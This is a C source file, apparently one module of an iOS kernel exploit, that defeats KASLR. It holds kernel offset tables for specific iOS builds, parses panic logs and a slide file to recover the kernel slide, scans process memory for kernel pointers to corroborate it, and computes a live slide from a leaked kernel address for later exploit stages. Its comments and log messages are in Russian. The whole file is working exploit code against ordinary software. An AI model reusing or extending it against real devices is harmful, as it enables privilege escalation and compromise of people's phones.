#include "exploit.h"
#include "kslide.h"
#include <sys/sysctl.h>
#include <sys/stat.h>
#include <mach-o/dyld.h>
#include <mach-o/loader.h>
#include <fcntl.h>

/* 23C55: text_exec pre = 0x7FB0000 (выведено из panic-лога).
   PRE_SLIDE_TEXT_EXEC в exploit.h = 0x8140000 — для другой сборки. */
#define NK_TE_PRE_23C55 0xFFFFFFF007FB0000ULL

static const nk_koffs_t s_koffs_table[] = {
{ "23C55",
  0xFFFFFFF007004000ULL, NK_TE_PRE_23C55,
  0xFFFFFFF007BAC000ULL, 0xFFFFFFF0080F4000ULL,
  0xFFFFFFF00AC74000ULL },
{ "24A437",
  0xFFFFFFF007004000ULL, 0xFFFFFFF008140000ULL,
  0xFFFFFFF007BAC000ULL, 0xFFFFFFF0080F4000ULL,
  0xFFFFFFF00AC74000ULL },
{ "22A3354",
  0xFFFFFFF007100000ULL, 0xFFFFFFF008110000ULL,
  0xFFFFFFF007B80000ULL, 0xFFFFFFF0080C4000ULL,
  0xFFFFFFF00ABD8000ULL },
{ NULL, 0, 0, 0, 0, 0 }
};
const nk_koffs_t *g_koffs = NULL;

#define MAX_CAND 64
static uint64_t s_cand[MAX_CAND];
static int      s_ncand = 0;

#define MAX_STASH 64
static uint64_t s_stash[MAX_STASH];
static int      s_nstash = 0;

static int s_src = 0;   /* 0 none, 1 panic, 2 leak, 3 slide.txt */
static int s_stale = 1; /* 1 = протух после ребута; live-источник выставляет 0 */

int nk_kaslr_candidate_count(void) { return s_ncand; }
uint64_t nk_kaslr_candidate(int i) { return (i >= 0 && i < s_ncand) ? s_cand[i] : 0; }

/* ---------- песочничный Documents ---------- */
static const char *docs_dir(void) {
    static char d[600];
    if (d[0]) return d;
    const char *h = getenv("HOME");
    if (!h || !h[0]) h = "/var/mobile";
    snprintf(d, sizeof(d), "%s/Documents", h);
    mkdir(d, 0755);
    return d;
}

static void print_docs_path(void) {
    nk_log("[KASLR] клади panic.log / srk801_slide.txt сюда:");
    nk_log("[KASLR]   %s", docs_dir());
}

/* ---------- парсер hex ---------- */
static int hex_at(const char *p, uint64_t *out) {
    while (*p && (*p == ' ' || *p == '\t' || *p == ':' || *p == '=' || *p == '\r' || *p == '\n')) p++;
    if (p[0] == '0' && (p[1] == 'x' || p[1] == 'X')) p += 2;
    char *e = NULL;
    unsigned long long v = strtoull(p, &e, 16);
    if (e == p) return -1;
    *out = (uint64_t)v;
    return 0;
}

static int field(const char *txt, const char *label, uint64_t *out) {
    const char *p = txt;
    size_t ll = strlen(label);
    while ((p = strstr(p, label)) != NULL) {
        p += ll;
        if (hex_at(p, out) == 0) return 0;
    }
    return -1;
}

static long slurp(const char *path, char *buf, size_t cap) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;
    long n = (long)read(fd, buf, cap - 1);
    close(fd);
    if (n < 0) return -1;
    buf[n] = 0;
    return n;
}

static void apply_slide(uint64_t s, int src, int stale) {
    g_nk.slide = s;
    g_nk.base  = PRE_SLIDE_TEXT + s;   /* IMAGE BASE, единственное что пишем */
    g_nk.src   = src;
    g_nk.stale = stale;
    s_src = src;
    s_stale = stale;
}

/* 1 = слайд протух: выведен из panic-лога / slide.txt прошлого бута.
   НИКОГДА не подставлять в safe-address — после ребута значение ложное. */
int nk_kaslr_is_stale(void) { return s_stale; }

/* ---------- panic-текст: 6 вычетs ---------- */
static int panic_parse(const char *txt) {
    if (!txt || !*txt) return -1;
    uint64_t v, c[8];
    int n = 0;
    uint64_t te = (g_koffs && g_koffs->text_exec) ? g_koffs->text_exec : NK_TE_PRE_23C55;
    if (field(txt, "KernelCache slide", &v) == 0)      c[n++] = v;
    if (field(txt, "KernelCache base", &v) == 0)       c[n++] = v - PRE_SLIDE_TEXT;
    if (field(txt, "Kernel text base", &v) == 0)       c[n++] = v - (PRE_SLIDE_TEXT + 0x8000);
    if (field(txt, "Kernel text exec base", &v) == 0)  c[n++] = v - te;
    if (field(txt, "Kernel slide", &v) == 0)           c[n++] = v - 0x8000;
    if (field(txt, "Kernel text exec slide", &v) == 0) c[n++] = v - 0xFAC000;

    if (n < 2) { nk_log("[KASLR] panic: полей мало (n=%d)", n); return -1; }

    uint64_t best = 0; int bc = 0;
    for (int i = 0; i < n; i++) {
        if (!slide_valid(c[i])) continue;
        int cc = 0;
        for (int j = 0; j < n; j++) if (c[j] == c[i]) cc++;
        if (cc > bc) { bc = cc; best = c[i]; }
    }
    nk_log("[KASLR] panic-вычетов: %d", n);
    for (int i = 0; i < n; i++)
        nk_log("[KASLR]   cand[%d]=0x%llx align=%d", i,
               (unsigned long long)c[i], slide_valid(c[i]) ? 1 : 0);

    if (bc < 2) {
        nk_log("[-] KASLR panic: вычеты НЕ сошлись (best=%d). PRE/te не по сборке.", bc);
        return -1;
    }
    apply_slide(best, 1, 1);
    nk_log("[+] KASLR panic: slide=0x%llx base=0x%llx (agree %d/%d)",
           (unsigned long long)best, (unsigned long long)g_nk.base, bc, n);
    return 0;
}

static int load_panic_file(const char *path) {
    char buf[256 * 1024];
    if (slurp(path, buf, sizeof(buf)) < 0) return -1;
    return panic_parse(buf);
}

/* ---------- slide.txt: slide=0x.. или base=0x.. ---------- */
static int load_slide_file(void) {
    char p[700];
    snprintf(p, sizeof(p), "%s/srk801_slide.txt", docs_dir());
    char buf[4096];
    if (slurp(p, buf, sizeof(buf)) < 0) return -1;

    uint64_t s = 0;
    if (field(buf, "slide", &s) == 0) {
        if (!slide_valid(s)) {
            nk_log("[-] slide.txt: slide 0x%llx невалиден", (unsigned long long)s);
            return -1;
        }
        apply_slide(s, 3, 1);
        nk_log("[+] slide.txt: slide=0x%llx base=0x%llx",
               (unsigned long long)s, (unsigned long long)g_nk.base);
        return 0;
    }
    uint64_t b = 0;
    if (field(buf, "base", &b) == 0 && b > PRE_SLIDE_TEXT) {
        s = b - PRE_SLIDE_TEXT;
        if (!slide_valid(s)) {
            nk_log("[-] slide.txt: derived slide невалиден");
            return -1;
        }
        apply_slide(s, 3, 1);
        nk_log("[+] slide.txt: base=0x%llx -> slide=0x%llx",
               (unsigned long long)b, (unsigned long long)s);
        return 0;
    }
    nk_log("[-] slide.txt: нет ни slide= ни base=");
    return -1;
}

static int try_panic_paths(void) {
    print_docs_path();
    char p1[700], p2[700];
    snprintf(p1, sizeof(p1), "%s/panic.log", docs_dir());
    snprintf(p2, sizeof(p2), "%s/kernelpanic.log", docs_dir());
    if (load_panic_file(p1) == 0) { nk_log("[KASLR] panic из %s", p1); return 0; }
    if (load_panic_file(p2) == 0) { nk_log("[KASLR] panic из %s", p2); return 0; }
    static const char *extra[] = {
        "/var/mobile/Documents/panic.log",
        "/tmp/panic.log",
        "/Library/Logs/DiagnosticReports/kernelpanic.log",
    };
    for (size_t i = 0; i < sizeof(extra) / sizeof(extra[0]); i++)
        if (load_panic_file(extra[i]) == 0) {
            nk_log("[KASLR] panic из %s", extra[i]);
            return 0;
        }
    return -1;
}

/* ---------- корроборация по kptr ---------- */
static int corroborate(uint64_t slide) {
    if (!slide || s_nstash == 0) return 0;
    uint64_t lo = PRE_SLIDE_TEXT + slide;
    uint64_t hi = lo + 0x10000000ULL;
    int hits = 0;
    for (int i = 0; i < s_nstash; i++)
        if (s_stash[i] >= lo && s_stash[i] < hi) hits++;
    if (hits)
        nk_log("[+] корроборация: %d/%d kptr внутри образа — slide живой", hits, s_nstash);
    else {
        nk_log("[!] корроборация: НИ ОДИН из %d kptr не в окне образа.", s_nstash);
        nk_log("[!] panic со СТАРОГО бута. Без leak-вектора на 23C55 runtime-slide не взять.");
    }
    return hits;
}

/* ---------- vm_scan: стешим kptr ---------- */
static mach_vm_address_t own_lo[16], own_hi[16];
static int own_n = 0, own_done = 0;
static void own_init(void) {
    if (own_done) return;
    own_done = 1;
    const struct mach_header *h = _dyld_get_image_header(0);
    intptr_t sl = _dyld_get_image_vmaddr_slide(0);
    if (!h) return;
    uintptr_t p = (uintptr_t)h + sizeof(struct mach_header_64);
    for (uint32_t i = 0; i < h->ncmds && own_n < 16; i++) {
        const struct load_command *lc = (const struct load_command *)p;
        if (lc->cmd == LC_SEGMENT_64) {
            const struct segment_command_64 *sc = (const struct segment_command_64 *)p;
            own_lo[own_n] = (mach_vm_address_t)(sc->vmaddr + sl);
            own_hi[own_n] = (mach_vm_address_t)(sc->vmaddr + sl + sc->vmsize);
            own_n++;
        }
        p += lc->cmdsize;
    }
}

static int in_own(mach_vm_address_t a, mach_vm_size_t sz) {
    for (int i = 0; i < own_n; i++)
        if (a < own_hi[i] && (a + sz) > own_lo[i]) return 1;
    return 0;
}

static int cmp_u64(const void *a, const void *b) {
    uint64_t x = *(const uint64_t *)a, y = *(const uint64_t *)b;
    return (x > y) - (x < y);
}

#define MAX_PTRS 8192
static int vm_collect(uint64_t *ptrs, int max) {
    own_init();
    s_ncand = 0;
    s_nstash = 0;
    mach_vm_address_t addr = 0;
    mach_vm_size_t size = 0;
    uint32_t depth;
    vm_region_submap_info_data_64_t info;
    mach_msg_type_number_t cnt;
    int n = 0;
    while (n < max) {
        depth = 4096;
        cnt = VM_REGION_SUBMAP_INFO_COUNT_64;
        if (mach_vm_region_recurse(mach_task_self(), &addr, &size, &depth,
                (vm_region_recurse_info_t)&info, &cnt) != KERN_SUCCESS) break;
        if (!info.is_submap
            && (info.protection & VM_PROT_READ)
            && (info.protection & VM_PROT_WRITE)
            && !(info.protection & VM_PROT_EXECUTE)
            && size <= 64 * 1024 * 1024ULL
            && !in_own(addr, size)) {
            volatile uint64_t *p = (volatile uint64_t *)(uintptr_t)addr;
            uint64_t lim = size / 8;
            if (lim > 512 * 1024) lim = 512 * 1024;
            for (uint64_t i = 0; i < lim && n < max; i++) {
                uint64_t v = p[i];
                if (is_kptr(v)) {
                    ptrs[n++] = v;
                    if (s_nstash < MAX_STASH) s_stash[s_nstash++] = v;
                }
            }
        }
        addr += size;
    }
    if (n > 1) {
        qsort(ptrs, (size_t)n, sizeof(uint64_t), cmp_u64);
        int u = 0;
        for (int i = 0; i < n; i++)
            if (u == 0 || ptrs[u - 1] != ptrs[i]) ptrs[u++] = ptrs[i];
        n = u;
    }
    if (s_nstash > 1) {
        qsort(s_stash, (size_t)s_nstash, sizeof(uint64_t), cmp_u64);
        int u = 0;
        for (int i = 0; i < s_nstash; i++)
            if (u == 0 || s_stash[u - 1] != s_stash[i]) s_stash[u++] = s_stash[i];
        s_nstash = u;
    }
    for (int i = 0; i < n && s_ncand < MAX_CAND; i++)
        if ((ptrs[i] & 0xFFFFFULL) == 0) s_cand[s_ncand++] = ptrs[i];
    nk_log("[KASLR] collected %d unique kptrs, %d round candidates", n, s_ncand);
    return n;
}

/* ---------- LIVE источник: утечка известного символа ----------
   leak       — абсолютный адрес, прочитанный в ЭТОМ буте;
   leak_pre_abs — его pre-slide адрес из образа.
   slide = leak - leak_pre_abs. Ставит src=leak(2), stale=0 —
   это единственный источник, который safe-address режим E1 принимает. */
int nk_kaslr_from_known_leak(uint64_t leak, uint64_t leak_pre_abs) {
	if (!leak || !leak_pre_abs) {
		nk_log("[KASLR] leak: пустые входы leak=0x%llx pre=0x%llx",
		       (unsigned long long)leak, (unsigned long long)leak_pre_abs);
		return -1;
	}
	if (!is_kptr(leak) || !is_kptr(leak_pre_abs)) {
		nk_log("[KASLR] leak: не kptr leak=0x%llx pre=0x%llx",
		       (unsigned long long)leak, (unsigned long long)leak_pre_abs);
		return -1;
	}
	if (leak <= leak_pre_abs) {
		nk_log("[KASLR] leak: leak<=pre_abs 0x%llx<=0x%llx",
		       (unsigned long long)leak, (unsigned long long)leak_pre_abs);
		return -1;
	}
	uint64_t s = leak - leak_pre_abs;
	if (!slide_valid(s)) {
		nk_log("[KASLR] leak: slide 0x%llx невалиден (нужен <0x%x, 0x%x-выравнен)",
		       (unsigned long long)s, MAX_SLIDE, NK_PAGE_SZ);
		return -1;
	}
	if (g_nk.slide && g_nk.stale == 0 && g_nk.slide != s) {
		nk_log("[KASLR] leak: конфликт с живым slide=0x%llx (leak дал 0x%llx) — отклон",
		       (unsigned long long)g_nk.slide, (unsigned long long)s);
		return -1;
	}
	/* stash собирается vm_collect() в ЭТОМ буте — если он есть и ни один
	   kptr не попал в окно образа, вычет неверен (pre_abs не той сборки). */
	if (s_nstash > 0 && corroborate(s) == 0) {
		nk_log("[KASLR] leak: slide 0x%llx не подтверждён (%d kptr) — отклон",
		       (unsigned long long)s, s_nstash);
		return -1;
	}
	if (g_nk.slide == s && g_nk.stale == 0) {
		nk_log("[KASLR] leak: slide 0x%llx уже установлен живым источником",
		       (unsigned long long)s);
		return 0;
	}
	apply_slide(s, 2 /* NK_SRC_LEAK */, 0 /* live */);
	g_nk.verified = (s_nstash > 0) ? 1 : 0;
	nk_log("[+] KASLR leak: 0x%llx - 0x%llx -> slide=0x%llx base=0x%llx (LIVE src=leak)",
	       (unsigned long long)leak, (unsigned long long)leak_pre_abs,
	       (unsigned long long)s, (unsigned long long)g_nk.base);
	return 0;
}

uint64_t nk_kaslr_detect(void) {
	static uint64_t ptrs[MAX_PTRS];
    int np = vm_collect(ptrs, MAX_PTRS);
    if (np < 3) {
        nk_log("[-] KASLR: %d kptr в своей VM. Hermetic sandbox: runtime-slide невозможен.", np);
        return 0;
    }
    nk_log("[!] KASLR: есть %d kptr, но pre_abs неизвестен — слайд НЕ выводится.", np);
    nk_log("[!] Годятся только как корроборация panic/slide.txt.");
    return 0;
}

int nk_koffs_resolve(void) {
    char b[32] = {0};
    size_t l = sizeof(b) - 1;
    if (sysctlbyname("kern.osversion", b, &l, NULL, 0) != 0) b[0] = '\0';
    nk_log("[KASLR] osversion=\"%s\"", b[0] ? b : "(?)");
    for (int i = 0; s_koffs_table[i].build; i++) {
        if (strncmp(s_koffs_table[i].build, b, 31) == 0) {
            g_koffs = &s_koffs_table[i];
            nk_log("[+] таблица смещений: %s (text_exec pre=0x%llx)",
                   b, (unsigned long long)g_koffs->text_exec);
            return 0;
        }
    }
    nk_log("[-] build %s не в таблице; канонические PRE_* из panic-лога", b);
    g_koffs = NULL;
    return -1;
}

int nk_detect_slide(void) {
    g_nk.slide = 0;
    g_nk.base = 0;
    g_nk.src = 0;
    g_nk.stale = 1;   /* до подтверждённого live-источника считаем протухшим */
    s_src = 0;
    s_stale = 1;

    nk_koffs_resolve();

    /* 1) panic-лог из песочничного Documents */
    if (try_panic_paths() == 0) {
        corroborate(g_nk.slide);
        return 0;
    }
    /* 2) минимальный slide.txt */
    if (load_slide_file() == 0) {
        corroborate(g_nk.slide);
        return 0;
    }
    /* 3) vm_collect для корроборации */
    nk_kaslr_detect();

    nk_log("[-] KASLR: slide НЕ вычислен. Источники исчерпаны.");
    print_docs_path();
    nk_log("[-] Быстрее: %s/srk801_slide.txt со строкой: slide=0x2b584000", docs_dir());
    return -1;
}

int nk_kaslr_verify(void) {
    if (!g_nk.slide || !g_nk.base || g_nk.base <= PRE_SLIDE_TEXT)
        return -1;
    if (!slide_valid(g_nk.slide))
        return -1;
    if (s_nstash > 0 && corroborate(g_nk.slide) == 0) {
        nk_log("[-] KASLR verify: slide 0x%llx не подкреплён (kptrs из старого бута)",
               (unsigned long long)g_nk.slide);
        return -1;
    }
    g_nk.verified = 1;
    return 0;
}

const char *nk_kaslr_source_name(void) {
    switch (s_src) {
        case 1: return "panic";
        case 2: return "leak";
        case 3: return "slide.txt";
        default: return "none";
    }
}
